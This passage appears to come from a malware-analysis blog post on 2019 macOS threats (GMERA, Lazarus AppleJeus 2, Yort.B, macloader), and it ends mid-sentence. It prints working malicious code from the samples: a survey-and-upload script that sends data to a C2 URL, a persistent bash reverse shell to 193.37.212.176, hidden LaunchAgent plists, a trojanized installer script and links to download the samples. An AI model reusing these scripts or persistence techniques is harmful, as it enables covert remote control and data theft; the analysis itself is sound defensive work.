:\n\n```\n\n-----\n\n```\n$ pp\n#! /bin/bash\n...\nplist_text=\"PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHBsaXN0IFBVQkxJQyAiLS8vQXBw\necho \"$plist_text\" | base64 --decode > \"/tmp/.com.apple.upd.plist\"\necho \"tmpplist - $(cat /tmp/.com.apple.upd.plist))\" >> /tmp/loglog\ncp \"/tmp/.com.apple.upd.plist\" \"$HOME/Library/LaunchAgents/.com.apple.upd.plist\"\necho \"tmpplist - $(cat $HOME/Library/LaunchAgents/.com.apple.upd.plist))\" >> /tmp/loglog\nlaunchctl load \"/tmp/.com.apple.upd.plist\"\n\n```\nDecoding the `plist_text variable reveals the contents of this plist:`\n```\n$ python\n>>> import base64\n>>> plist_text=\"PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVB...\"\n>>> base64.b64decode(plist_text)\n>>> '<?xml version=\"1.0\" encoding=\"UTF-8\"?>\\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\\n<plist\nversion=\"1.0\">\\n<dict>\\n\\t<key>KeepAlive</key>\\n\\t<true/>\\n\\t<key>Label</key>\\n\\t<string>com.apples.app\nc</string>\\n\\t\\t<string>echo\n\\'d2hpbGUgOjsgZG8gc2xlZXAgMTAwMDA7IHNjcmVlbiAtWCBxdWl0OyBsc29mIC10aSA6MjU3MzMgfCB4YXJncyBraWxsIC05OyBzY\n | base64 --decode | bash</string>\\n\\t</array>\\n\\t<key>RunAtLoad</key>\\n\\t<true/>\\n</dict>\\n</plist>'\n\n```\nWhich, when formatted is a ‚Äòstandard‚Äô launch agent plist:\n```\n 1<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n 2<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" ...>\n 3<plist version=\"1.0\">\n 4<dict>\n 5 <key>KeepAlive</key>\n 6 <true/>\n 7 <key>Label</key>\n 8 <string>com.apples.apps.upd</string>\n 9 <key>ProgramArguments</key>\n10 <array>\n11  <string>sh</string>\n12  <string>-c</string>\n13  <string>echo 'd2hpbGUgOjsgZG8gc...RvbmU=' | base64 --decode | bash</string>\n14 </array>\n15 <key>RunAtLoad</key>\n16 <true/>\n17</dict>\n\n```\nAs the `~/Library/LaunchAgents/.com.apple.upd.plist has the` `RunAtLoad key set to` `<true/> the`\ncommands specified in the `ProgramArguments array will be automatically executed each time the user logs`\nin. \\\n\nCapabilities: Persistent remote shell\n\n[The TrendMicro report on](https://blog.trendmicro.com/trendlabs-security-intelligence/mac-malware-that-spoofs-trading-app-steals-user-information-uploads-it-to-website/) `GMERA notes that, ‚ÄúThe main Mach-O executable [of` `OSX.GMERA.A ] will launch the`\nfollowing bundled shell scripts in the `Resources directory:` `plugin,` `stock .‚Äù`\n\nDisassembling the main binary ( Stockfoli.app/Contents/MacOS/Stockfoli ) supports this claim:\n\n\n-----\n\n```\n                                q [ ],\n0x0000000100002271 4B8D0C76        lea    rcx, qword [r14+r14*2]\n0x0000000100002275 488D15600E0000     lea    rdx, qword [aStock]    ; \"stock\"\n...\n0x00000001000022f6 49891C06        mov    qword [r14+rax], rbx   \n0x00000001000022fa 4B8D047F        lea    rax, qword [r15+r15*2]\n0x00000001000022fe 488D0DDD0D0000     lea    rcx, qword [aPlugin]    ; \"plugin\"\n...\n0x0000000100002a09 4C89F7         mov    rdi, r14          ; argument #1 for\nmethod shellExecute\n0x0000000100002a0c E8CFF3FFFF       call    shellExecute        ; shellExecute\n0x0000000100002b00 4889DF         mov    rdi, rbx          ; argument #1 for\nmethod shellExecute\n0x0000000100002b03 E8D8F2FFFF       call    shellExecute        ; shellExecute\n\n```\nBoth the `plugin and` `stock files are bash scripts:`\n```\n$ file Stockfoli.app/Contents/Resources/plugin \nStockfoli.app/Contents/Resources/plugin: Bourne-Again shell script text executable, ASCII text\n$ file Stockfoli.app/Contents/Resources/stock\nStockfoli.app/Contents/Resources/stock: Bourne-Again shell script text executable, ASCII text\n\n```\nFirst, let‚Äôs look at the `plugin script:`\n\n\n-----\n\n```\n 2\n 3uploadURL=\"https://appstockfolio.com/panel/upload.php\"\n 4\n 5function getINFO() {\n 6 htmlbase64 \"\"\"$(whoami) $(curl -s ipinfo.io | tr -d \"{\"\"}\"\",\"\"\\\"\")\"\"\" > /tmp/.info\n 7 htmlbase64 \"$(ls /Applications)\" >> /tmp/.info\n 8 htmlbase64 \"\"\"$(ls -lh ~/Documents | awk '{print $5, \"|\", $6, $7, \"|\", $9}')\"\"\" >> /tmp/.info\n 9 htmlbase64 \"$(ls -lh ~/Desktop | awk '{print $5, \"|\", $6, $7, \"|\", $9}')\" >> /tmp/.info\n10 htmlbase64 \"$(date -r /var/db/.AppleSetupDone +%F)\" >> /tmp/.info\n11 htmlbase64 \"$(df -h | awk '{print $1, $4, $5, $9}' | tail -n +2)\" >> /tmp/.info\n12 htmlbase64 \"$(system_profiler SPDisplaysDataType)\" >> /tmp/.info\n13 htmlbase64\n\"$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | awk\n'{print $1}' | tail -n +2)\" >> /tmp/.info\n14 screencapture -t jpg -x /tmp/screen.jpg\n15 sips -z 500 800 /tmp/screen.jpg\n16 sips -s formatOptions 50 /tmp/screen.jpg\n17 cat /tmp/screen.jpg | base64 >> /tmp/.info\n18 rm /tmp/screen.jpg\n19}\n20\n21...\n22\n23function sendIT(){\n24 unique=\"$(system_profiler SPHardwareDataType | grep Serial | cut -d \":\" -f 2 | xargs)\"\n25 whoami=\"$(whoami | tr -dc '[:alnum:]\\n\\r' | tr '[:upper:]' '[:lower:]' | xargs)\"\n26 ID=\"${whoami}_${unique}\"\n27 while true; do\n28  get=\"$(curl -k -s -F \"server_id=$ID\" -F \"file=@/tmp/.info\" $uploadURL)\"\n29  echo \"$get\"\n30  result=\"\"\"$(par_json \"$get\" \"result\")\"\"\"\n31  if [[ \"$result\" == \"Ok\" ]]; then\n32   echo \"File uploaded\"\n33   while true; do\n34    sleep 120\n35    get=\"$(curl -k -s -F \"server_id=$ID\" $uploadURL)\"\n36    pass=\"\"\"$(par_json \"$get\" \"text\")\"\"\"\n37    if [ \"$pass\" != \"wait\" ] && [ ! -z $pass ]; then\n38     echo \"$pass\" > ~/Library/Containers/.pass\n39     rm /tmp/.info\n40     exit 1\n41    fi\n42   done\n43  else\n44   sleep 120\n45  fi\n46 done\n47}\n48\n49getINFO\n50sendIT\n\n```\nThe script first gathers a bunch of information about the infected system, via the `getINFO function. This`\ninformation includes survey including:\n\nthe username of the logged in user (via `whoami )`\nthe infected system‚Äôs ip address (via `curl -s ipinfo.io )`\ninstalled applications (via `ls /Applications )`\nthe files on the `Documents and` `Desktop folder (via` `ls -lh ~/Documents and ls -lh ~/Desktop).`\nOS install date (via `date -r /var/db/.AppleSetupDone )`\ndisk usage (via `df -h )`\ndisplay informatio (via `system_profiler SPDisplaysDataType )`\n\n\n-----\n\nwifi access point (via\n\n```\n/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport\n\n```\n```\n   -s )\n\n```\na screencapture (via `screencapture )`\n\nIt then uploads this survey data to `https://appstockfolio.com/panel/upload.php, writing out the server‚Äôs`\nresponse to `~/Library/Containers/.pass`\n\nNow, on to the `stock script:`\n```\n 1//stock\n 2\n 3#! /bin/bash\n 4\n 5louncherPATH=\"`dirname \"$0\"`/appcode\"\n 6if [ -e $louncherPATH ]\n 7then\n 8cp $louncherPATH /private/var/tmp/appcode\n 9find ~/Downloads ~/Documents ~/Desktop -type f -name '.app' | xargs base64 -D | bash\n10find ~/Downloads ~/Documents ~/Desktop -type f -name '.app' | xargs rm\n11  while true; do\n12    if [ -f ~/Library/Containers/.pass ]; then\n13      pass=\"$(cat ~/Library/Containers/.pass | tr -d '\\040\\011\\012\\015')\"\n14      openssl aes-256-cbc -d -a -in /private/var/tmp/appcode -out /tmp/appcode -k \"$pass\"\n15      chmod +x /tmp/appcode\n16      /tmp/appcode\n17      sleep 1\n18      nohup bash -c \"find ~/Downloads ~/Documents ~/Desktop /Applications /tmp -type f -name\n'appcode' 2> >(grep -v -e 'Permission denied' -e 'Operation not permitted' >&2) | xargs rm \" <\n/dev/null >> /tmp/mylogfile 2>&1 &\n19      rm ~/Library/Containers/.pass\n20      exit 1\n21    fi\n22  sleep 30\n23  done\n24fi\n\n```\nThe `stock script first copies the` `Resources/appcode file to a temporary location`\n( /private/var/tmp/appcode ). If the `~/Library/Containers/.pass file exists (recall this is created by the`\n```\nplugin script with information from the server), it will decrypt and execute the copy of the appcode file.\n\n```\nUnfortunately as the server is offline, the `.pass is not created, and thus the` `appcode file cannot be`\ndecrypted:\n\n\"We suspect the file appcode is a malware file that contains additional routines. However, at the time of\nwriting, we were unable to decrypt this file since the upload URL\nhxxps://appstockfolio.com/panel/upload[.]php was inaccessible\" -TrendMicro\n\nThough the `OSX.GMERA.B specimen shares various similarities with` `OSX.GMERA.A (such as its infection`\nvector of a trojanized `Stockfolio.app ), its payload is different.`\n\nRecall `OSX.GMERA.B executes the` `Resources/run.sh script.`\n\nAfter checking in with a server located at `http://owpqkszz.info/link.php, the code within the` `run.sh`\nscript creates an interactive remote shell to `193.37.212.176 :`\n```\n1scre=`screen -d -m bash -c 'bash -i >/dev/tcp/193.37.212.176/25733 0>&1'`\n2echo \"scre - $scre)\" >> /tmp/loglog\n\n```\n\n-----\n\nWe also noted that `GMERA.B (via code within` `run.sh ) persists a launch agent to:`\n```\n~/Library/LaunchAgents/.com.apple.upd.plist, to automatically execute commands whenever the user\n\n```\nlogs in:\n```\n 1... \n 2 \n 3 <key>ProgramArguments</key>\n 4 <array>\n 5  <string>sh</string>\n 6  <string>-c</string>\n 7  <string>echo 'd2hpbGUgOjsgZG8gc...RvbmU=' | base64 --decode | bash</string>\n 8 </array>\n 9\n10...\n\n```\nDecoding the base-64 encoded data in the command reveals the following:\n```\nwhile :; do sleep 10000; screen -X quit; lsof -ti :25733 | xargs kill -9; screen -d -m\nbash -c 'bash -i >/dev/tcp/193.37.212.176/25733 0>&1'; done\n\n```\n‚Ä¶ah, a persistent interactive remote shell to `193.37.212.176 .`\nThis of course gives a remote attacker, continued access to the infected system and the ability to run arbitrary\ncommands.\n\n\\\n\n## üëæ Lazarus (unnamed)\n\nThis unnamed specimen, is yet another Lazarus group backdoor that affords a remote attacker complete\ncommand and control over infected macOS systems.\n\n[Download: OSX.AppleJeus (password:](https://objective-see.com/downloads/malware/AppleJeus.zip) `infect3d )`\n\nWriteups:\n\n[‚ÄúPass the AppleJeus‚Äù](https://objective-see.com/blog/blog_0x49.html)\n\n\\\n\nInfection Vector: Trojanized (Trading) Application\n\nIn early October, [@malwrhunterteam tweeted about some interesting malware:](https://twitter.com/malwrhunterteam/)\n\n\n-----\n\nSo, in short: anyone installed this JMT Trader recently (or anytime? others will probably have the time\nto dig and find out...), got some APT's malware with it too... [pic.twitter.com/tEYJZEYxAq](https://t.co/tEYJZEYxAq)\n\n[‚Äî MalwareHunterTeam (@malwrhunterteam) October 11, 2019](https://twitter.com/malwrhunterteam/status/1182625004191731712?ref_src=twsrc%5Etfw)\n\n‚Ä¶noting this malware may have been seen before (or at least was closely related to previous specimen\nanalyzed by Kaspersky (as `OSX.AppleJeus, by Lazarus group)):`\n\nIf that highlighted not says anything to you... then look here in what malware it was seen before:\n[https://t.co/xSfDulILh0](https://t.co/xSfDulILh0)\ncc [@craiu](https://twitter.com/craiu?ref_src=twsrc%5Etfw) [pic.twitter.com/g2CyU87aLr](https://t.co/g2CyU87aLr)\n\n[‚Äî MalwareHunterTeam (@malwrhunterteam) October 11, 2019](https://twitter.com/malwrhunterteam/status/1182607363158822912?ref_src=twsrc%5Etfw)\n\nWe noted early, that the de-facto method of infection utilized by the Lazarus group, was trojanized\ncryptocurrency trading applications. This samples (which we refer to as `OSX.AppleJeus 2, for lack of a better`\nname), follow an identical approach to infect macOS targets. First, a ‚Äúnew‚Äù company was created: ‚ÄúJMT\n[Trading‚Äù (hosted at: https://www.jmttrading.org/):](https://www.jmttrading.org/)\n\nLooks reasonably legitimate, ya? Following the ‚ÄúDownload from Github‚Äù link, will take the user to:\n[https://github.com/jmttrading/JMTTrader/releases, which contains various files for download. Files that contain](https://github.com/jmttrading/JMTTrader/releases)\nmalware (specifically a disk image, that contain package named `JMTTrader.pkg ): \\`\n\n\n-----\n\nIf the user is coerced into downloading and installing the trojanized cryptocurrency trading application, they will\nbe infected.\n\nNote that the installer requires administrative privileges, but the malware will kindly ask for such privileges\nduring installation:\n\n\\\n\nPersistence: Launch Daemon\n\n\n-----\n\nThe `JMTTrader.pkg contains a` `postinstall script (which contains the actual installation instructions).`\nUsing the `Suspicious Package app (available for download here), we can view the contents of this install file:`\n```\n 1#!/bin/sh\n 2mv /Applications/JMTTrader.app/Contents/Resources/.org.jmttrading.plist \n 3  /Library/LaunchDaemons/org.jmttrading.plist\n 4\n 5chmod 644 /Library/LaunchDaemons/org.jmttrading.plist\n 6\n 7mkdir /Library/JMTTrader\n 8\n 9mv /Applications/JMTTrader.app/Contents/Resources/.CrashReporter \n10  /Library/JMTTrader/CrashReporter\n11\n12chmod +x /Library/JMTTrader/CrashReporter\n13\n14/Library/JMTTrader/CrashReporter Maintain &\n\n```\nIn short, this install script:\n\n1. Installs a launch daemon plist ( org.jmttrading.plist )\n2. Installs a daemon ( CrashReporter )\n3. Executes said daemon with the `Maintain command line parameter.`\n\nBoth the daemon‚Äôs plist and binary are (originally) embedded into an application, `JMTTrader.app found within`\nthe `.pkg . Specifically they‚Äôre hidden files found in the` `/Resources directory;`\n\n`Resources/.org.jmttrading.plist` and `Resources/.CrashReporter :`\n\nUsing the ‚ÄúSuspicious Package‚Äù app we can extract both these file for analysis.\n\nFirst, let‚Äôs look at the launch daemon plist ( org.jmttrading.plist ):\n\n\n-----\n\n```\n                g\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Label</key>\n    <string>org.jmttrading.jmttrader</string>\n    <key>ProgramArguments</key>\n    <array>\n        <string>/Library/JMTTrader/CrashReporter</string>\n        <string>Maintain</string>\n    </array>\n    <key>RunAtLoad</key>\n    <true/>\n</dict>\n</plist>\n\n```\nAs expected, it references the daemon `/Library/JMTTrader/CrashReporter (in the` `ProgramArguments`\narray). As the `RunAtLoad is set to` `true macOS will automatically (re)start the daemon every time the`\nsystem is rebooted. \\\n\nCapabilities: Persistent Backdoor\n\nThe malware persists (via a Launch Daemon) the `CrashReporter binary.`\n\nVia the `file command, we can determine its file type (Mach-O 64-bit):`\n```\n$ file ~/Downloads/.CrashReporter \n~/Downloads/.CrashReporter: Mach-O 64-bit executable x86_64\n\n```\n[Using my WhatsYourSign utility, we can easily ascertain it‚Äôs code-signing status. Though signed, it‚Äôs signed ad-](https://objective-see.com/products/whatsyoursign.html)\nhoc:\n\nRunning the `strings command, affords us valuable insight into the (likely) functionality of the binary.`\n\n\n-----\n\n```\n$ g p\nContent-Disposition: form-data; name=\"%s\"; \njGzAcN6k4VsTRn9\n...\nmont.jpg\n...\nbeastgoc.com\nhttps://%s/grepmonux.php\nPOST\n...\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121\nSafari/537.36\nX,%`PMk--Jj8s+6=\n\n```\n\\\nAlways run the `strings command with the` `-a flag to instruct it to scan the entire file for printable (ASCII)`\nstrings!\n\nFrom the output of the strings command, we can see some interesting, well, strings!\n```\n   beastgoc.com, https://%s/grepmonux.php\n\n```\nlikely a download or C&C server?\n```\n   Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...\n\n```\nthe binary‚Äôs user-agent (perhaps useful as an IOC)?\n```\n   X,%\\`PMk--Jj8s+6=\n\n```\nperhaps an encryption or decryption key?\n\nEach time the malware is started, it sends an HTTP `POST request to`\n```\nhttps://beastgoc.com/grepmonux.php containing the following data:\n(lldb)x/s 0x100260000\n0x100260000: \"--jGzAcN6k4VsTRn9\\r\\nContent-Disposition: form-data; name=\"token\"; \\r\\n\\r\\n756222899\\r\\n-jGzAcN6k4VsTRn9\\r\\nContent-Disposition: form-data; name=\"query\"; \\r\\n\\r\\nconn\\r\\n-jGzAcN6k4VsTRn9\\r\\nContent-Disposition: form-data; name=\"content\"; filename=\"mont.jpg\"\\r\\nContent-Type:\napplication/octet-stream\\r\\n\\r\\n\\xffffffeb'6MQMk-|Oj8\\r\\n--jGzAcN6k4VsTRn9--\\r\\n\"\n\n```\nThe command and control server will respond with (encrypted) tasking.\n\n\n-----\n\n```\n       _ g () {\n 2\n 3...\n 4\n 5send_to_base(_g_token, 0x0, 0x0, r12, r13, 0x1);\n 6\n 7//decrypt\n 8do {\n 9  (r12 + rax) = *(int8_t *)(r12 + rax) ^ *(int8_t *)((rax & 0xf) + _cbc_iv);\n10  rax = rax + 0x1;\n11} while (rbx != rax);\n12\n13\n14//handle tasking (commands)\n15if (strcmp(r12, \"exit\") == 0x0) goto exit;\n16\n17if (strcmp(r12, \"kcon\") == 0x0) goto kcon;\n18\n19if (is_str_start_with(r12, \"up \") == 0x0) goto up;\n20\n21...\n\n```\nUnfortunately during analysis, the C&C server did not return any tasking. However, via static analysis, we can\nfairly easily ascertain the malware‚Äôs capabilities.\n\nFor example, the malware supports an ‚Äúexit‚Äù command, which will (unsurprisingly) causes the malware to exit:\n```\n 1if (strcmp(r12, \"exit\") == 0x0) goto exit;\n 2\n 3...\n 4\n 5exit:\n 6  r14 = 0x250;\n 7  var_434 = 0x0;\n 8  __bzero(r12, 0x30000);\n 9  send_to_base(*(int32_t *)_g_token, r14, 0x2, r12, &var_434, 0x2);\n10  free(r12);\n11  free(r14);\n12  exit(0x0);\n\n```\nIf the malware receives the `up command, it appears to contain logic to open then write to a a file (i.e. upload a`\nfile from the C&C server to an infected host):\n\n\n-----\n\n```\n   ( _ _ _ (, p ) )\n 2{\n 3  //open file\n 4  rax = fopen(&var_430, \"wb\");\n 5  \n 6  //(perhaps) get file contents from C&C server?\n 7  send_to_base(*(int32_t *)_g_token, r14, 0x2, r12, r13, 0x2)\n 8  ...\n 9\n10  //decrypt\n11  do {\n12     (r12 + rax) = (r12 + rax) ^ (rax & 0xf) + _cbc_iv);\n13      rax = rax + 0x1;\n14  } while (rbx != rax);\n15\n16  //write out to disk\n17  fwrite(r12, rbx, 0x1, var_440);\n18\n19  //close\n20  fclose(var_440);\n21\n22}\n\n```\nOther commands, will cause the malware to invoke a function named: `proc_cmd :`\n```\n1if ((rbx < 0x7) || (is_str_start_with(r12, \"stand \") == 0x0)) \n2  goto loc_10000241c;\n3\n4loc_10000241c:\n5  rax = proc_cmd(r12, r14, &var_438);\n\n```\nThe `proc_cmd function appears to execute a command via the shell (specifically via the` `popen API):`\n```\n1int proc_cmd(int * arg0, int * arg1, unsigned int * arg2) {\n2  r13 = arg2;\n3  r14 = arg1;\n4  \n5  __bzero(&var_430, 0x400);\n6  sprintf(&var_430, \"%s 2>&1 &\", arg0);\n7  rax = popen(&var_430, \"r\");\n$ man popen\nFILE * popen(const char *command, const char *mode);\nThe popen() function ``opens'' a process by creating a bidirectional pipe, forking, and invoking the\nshell.\nThe command argument is a pointer to a null-terminated string containing a shell command line. This\ncommand is passed to /bin/sh, using the -c flag; interpretation, if any, is performed by the shell.\n\n```\nThe ability to remotely execute commands, clearly gives a remote attacker full and extensible control over the\ninfected macOS system!\n\n\\\n\n## üëæ OSX.Yort.B\n```\nOSX.Yort.B is a close variant to the Lazarus group‚Äôs OSX.Yort.A ; a backdoor that affords a remote attacker\n\n```\ncomplete command and control over infected macOS systems.\n\n\n-----\n\n\\\n\n\n[Download: OSX.Yort.B (password:](https://objective-see.com/downloads/malware/Yort.zip) `infect3d )`\n\nWriteups:\n\n[‚ÄúMac Backdoor Linked to Lazarus Targets Korean Users‚Äù](https://blog.trendmicro.com/trendlabs-security-intelligence/mac-backdoor-linked-to-lazarus-targets-korean-users/)\n\n[‚ÄúLazarus Take 3: FlashUpdateCheck, Album.app‚Äù](https://www.sentinelone.com/blog/macos-malware-outbreaks-2019-the-second-6-months/)\n\nInfection Vector: Trojanized Application\n\n\nIn late October, Twitter user [@cyberwar_15 uncovered a new Lazarus group backdoor, targeting macOS users.](https://twitter.com/cyberwar_15)\n\n[#NorthKorea](https://twitter.com/hashtag/NorthKorea?src=hash&ref_src=twsrc%5Etfw) [#Lazarus](https://twitter.com/hashtag/Lazarus?src=hash&ref_src=twsrc%5Etfw) [#XLS](https://twitter.com/hashtag/XLS?src=hash&ref_src=twsrc%5Etfw) [#MacOS](https://twitter.com/hashtag/MacOS?src=hash&ref_src=twsrc%5Etfw)\n\nÏó∞Ïù∏Ïã¨Î¶¨ÌÖåÏä§Ìä∏.xls\n[6850189bbf5191a76761ab20f7c630efhttps://t.co/nDQKtzjufo a8096ddf8758a79fdf68753190c6216a](https://t.co/nDQKtzjufo)\n\n[C2 ÎèôÏùºhttps://t.co/SDIgyrrZv2https://t.co/u347K2ltoXhttps://t.co/MUfL28vtmB](https://t.co/SDIgyrrZv2) [pic.twitter.com/lwjVfIeeSE](https://t.co/lwjVfIeeSE)\n\n[‚Äî CyberWar - Ïã∏Ïõå (@cyberwar_15) October 22, 2019](https://twitter.com/cyberwar_15/status/1186612111717191680?ref_src=twsrc%5Etfw)\n\nHis tweet identified a malicious excel ( xls ) document, and a malicious application `Album.app .`\n\nThough Lazarus group has previously utilized malicious ‚Äúmacro-laden‚Äù office documents to target macOS users\n(e.g. [OSX.Yort) is malicious excel document (as noted by TrendMicro) contains no macOS logic:](https://blog.trendmicro.com/trendlabs-security-intelligence/mac-backdoor-linked-to-lazarus-targets-korean-users/)\n```\n$ olevba Ïó∞Ïù∏Ïã¨Î¶¨ÌÖåÏä§Ìä∏.xls\n===============================================================================\nFILE: Ïó∞Ïù∏Ïã¨Î¶¨ÌÖåÏä§Ìä∏.xls\nType: OLE\n------------------------------------------------------------------------------VBA MACRO Module1.bas \nin file: Ïó∞Ïù∏Ïã¨Î¶¨ÌÖåÏä§Ìä∏.xls - OLE stream: u'_VBA_PROJECT_CUR/VBA/Module1'\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n#If Mac Then\n#Else\n\n```\n‚Ä¶thus is seems likely to assume that the malicious application ( Album.app ) is instead directly distributed to\ntargets (perhaps as an email attachment).\n\nAs the application is unsigned user‚Äôs would have to manually disable or work around Gatekeeper: \\\n\n\n-----\n\n```\n$ codesign -dvv /Users/patrick/Downloads/yort_b/Album.app \n/Users/patrick/Downloads/yort_b/Album.app: code object is not signed at all\n\n```\nThus, its unlikely many macOS users were infected ‚Ä¶though in a targeted APT operation, sometimes just one\nis enough!\n\nPersistence: Launch Agent\n\nAlthough the original version of `Yort was not persisted,` `OSX.Yort.B is persisted as a launch agent.`\n\nSpecifically, if the user is coerced into running the malicious application, `Album.app, it will persistently install a`\nlaunch agent; `~/Library/Launchagents/com.adobe.macromedia.plist .`\n\nTaking a peek at disassembly of the malicious application‚Äôs binary ( Album.app/Contents/macOS/Flash\n```\nPlayer ), reveals an embedded property list and code that will both save out this plist, then launch it via\nlaunchctl load :\n\n```\n\n-----\n\n```\n        p( _, p, );\n 2if (rax != 0x0) {\n 3    memset(&var_1410, 0x0, 0x400);\n 4    var_8144 = sprintf(&var_1410, \"%s/Library/LaunchAgents/%s\", \n 5              &var_1010, \"com.adobe.macromedia.flash.plist\");\n 6\n 7    rax = fopen(&var_1410, \"w\");\n 8    var_80C0 = rax;\n 9    if (var_80C0 != 0x0) {\n10        fprintf(var_80C0, \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\n11        \\n<!DOCTYPE plist PUBLIC \\\"-//Apple//DTD PLIST 1.0//EN\\\" ...\">\n12        \\n<plist version=\\\"1.0\\\">\\n<dict>\\n\\t<key>EnvironmentVariables</key>\n13        \\n\\t<dict>\\n\\t\\t<key>PATH</key>\\n\\t\\t<string>/usr/local/bin:/‚Ä¶\");\n14        fclose(var_80C0);\n15    }\n16    memset(&var_1410, 0x0, 0x400);\n17    var_816C = sprintf(&var_1410, \"launchctl load -w \\\"%s/Library/LaunchAgents/%s\\\"\", \n18              &var_1010, \"com.adobe.macromedia.flash.plist\");\n19    rax = system(&var_1410);\n20}\n\n```\n[We can also dynamically observe this via our FileMonitor:](https://objective-see.com/products/utilities.html#FileMonitor)\n```\n# FileMonitor.app/Contents/MacOS/FileMonitor -filter \"Flash Player\" -pretty\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_CREATE\",\n \"file\" : {\n  \"destination\" : \"~/Library/LaunchAgents/com.adobe.macromedia.flash.plist\",\n  \"process\" : {\n   \"uid\" : 501,\n   \"arguments\" : [\n   ],\n   \"ppid\" : 1,\n   \"ancestors\" : [\n    1\n   ],\n   \"signing info\" : {\n    \"csFlags\" : 0,\n    \"isPlatformBinary\" : 0,\n    \"cdHash\" : \"00000000000000000000\"\n   },\n   \"path\" : \"Album.app/Contents/MacOS/Flash Player\",\n   \"pid\" : 1031\n  }\n },\n \"timestamp\" : \"2019-12-27 21:05:48 +0000\"\n}\n\n```\n[Of course, this persistence is readily detected by our BlockBlock tool:](https://objective-see.com/products/blockblock.html)\n\n\n-----\n\nBy means of the `com.adobe.macromedia.flash.plist file, the malware perists a binary:`\n```\n/Users/user/.FlashUpdateCheck (as specified via the Program key):\ndefaults read ~/Library/LaunchAgents/com.adobe.macromedia.flash.plist\n{\n  EnvironmentVariables =   {\n    PATH = \"/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:\";\n  };\n  KeepAlive = 0;\n  Label = FlashUpdate;\n  LaunchOnlyOnce = 1;\n  Program = \"/Users/user/.FlashUpdateCheck\";\n  RunAtLoad = 1;\n}\n\n```\nAs the `RunAtLoad key is set, macOS will automatically (re)start the` `.FlashUpdateCheck binary each time`\nthe user logs in.\n\nCapabilities: Backdoor\n\nRecall when the user runs the malicious `Album.app it persists a hidden binary,` `.FlashUpdateCheck`\n\nWe can observe this binary being dropped by `Album.app :`\n\n\n-----\n\n```\n         pp y p y\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_WRITE\",\n \"file\" : {\n  \"destination\" : \"/Users/user/.FlashUpdateCheck\",\n  \"process\" : {\n   \"uid\" : 501,\n   \"arguments\" : [\n   ],\n   \"ppid\" : 1,\n   \"ancestors\" : [\n    1\n   ],\n   \"signing info\" : {\n    \"csFlags\" : 0,\n    \"isPlatformBinary\" : 0,\n    \"cdHash\" : \"00000000000000000000\"\n   },\n   \"path\" : \"/Users/user/Desktop/Album.app/Contents/MacOS/Flash Player\",\n   \"pid\" : 1031\n  }\n },\n \"timestamp\" : \"2019-12-27 21:05:48 +0000\"\n}\n\n```\nThe hidden `.FlashUpdateCheck binary is basic backdoor, essentially identical to` `OSX.Yort ( mt.dat )`\nwhich we covered early in this blog post.\n\nIn their [brief writeup on the malware, SentinelOne, notes this fact as well, stating that:](https://www.sentinelone.com/blog/macos-malware-outbreaks-2019-the-second-6-months/)\n\n\"*research suggests that the payload is the same backdoor payload we described earlier this year*\" SentinelOne\n\nOur analysis confirms this (as does a quick look at the embedded strings):\n\nIn OSX.Yort.B, the Lazarus group attackers has changed a few strings, and removed various function names (to\nslightly complicate analysis).\n‚Ä¶for example, in OSX.Yort.A the execute command function was aptyl named ‚ÄúReplyCmd‚Äù, while the file\ndownload command was named ‚ÄúReplyDown‚Äù. In OSX.Yort.B, these functions remain unnamed.\n\nAs we detailed the capabilities of this backdoor above, we won‚Äôt (re)cover it again here. However, the recall it\nsupports ‚Äústandard‚Äù backdoor commands such as:\n\n\n-----\n\nsurvey\nfile download/upload\n(shell)command execution\n\nArmed with these capabilities, remote attacker can maintain full remote control over the infected macOS\nsystem!\n\n\\\n\n## üëæ Lazarus Loader (aka macloader )\n\nYet another Lazarus group creation (internally named `macloader ), this first-stage implant loader, can`\ndownload and execute modules directly from memory!\n\n[Download: macloader (password:](https://objective-see.com/downloads/malware/AppleJeus.zip) `infect3d )`\n\nWriteups:\n\n[‚ÄúLazarus Group Goes ‚ÄòFileless‚Äô‚Äù](https://objective-see.com/blog/blog_0x53.html)\n\n[‚ÄúNewly discovered Mac malware uses ‚Äúfileless‚Äù technique to remain stealthy‚Äù](https://arstechnica.com/information-technology/2019/12/north-koreas-lazarus-hackers-up-their-game-with-fileless-mac-malware/)\n\n\\\n\nInfection Vector: Trojanized (Trading) Application\n\nRecently, [Dinesh_Devadoss posted a tweet about another Lazarus group macOS trojan:](https://twitter.com/dineshdina04/)\n\n[Another #Lazarus](https://twitter.com/hashtag/Lazarus?src=hash&ref_src=twsrc%5Etfw) [#macOS](https://twitter.com/hashtag/macOS?src=hash&ref_src=twsrc%5Etfw) [#trojan](https://twitter.com/hashtag/trojan?src=hash&ref_src=twsrc%5Etfw)\n\nmd5: 6588d262529dc372c400bef8478c2eec\n\nhxxps://unioncrypto.vip/\n\n[Contains code: Loads Mach-O from memory and execute it / Writes to a file and execute it@patrickwardle](https://twitter.com/patrickwardle?ref_src=twsrc%5Etfw)\n[@thomasareed](https://twitter.com/thomasareed?ref_src=twsrc%5Etfw) [pic.twitter.com/Mpru8FHELi](https://t.co/Mpru8FHELi)\n\n[‚Äî Dinesh_Devadoss (@dineshdina04) December 3, 2019](https://twitter.com/dineshdina04/status/1201834142704394242?ref_src=twsrc%5Etfw)\n\nWe‚Äôve 